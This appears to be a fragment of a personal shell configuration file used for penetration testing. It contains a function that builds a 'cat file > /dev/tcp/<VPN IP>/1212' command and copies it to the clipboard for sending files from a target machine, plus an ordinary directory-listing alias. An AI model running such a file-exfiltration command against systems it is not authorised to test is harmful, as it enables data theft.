...
nget(){
    echo "cat $1 > /dev/tcp/$(ip -4 addr show tun0 | awk '/inet / {print $2}' | cut -d/ -f1)/1212"| xargs echo -n | DISPLAY=:0 xclip -sel clip
...
alias ls="eza -alF --color=auto --icons=auto --time-style long-iso -o"
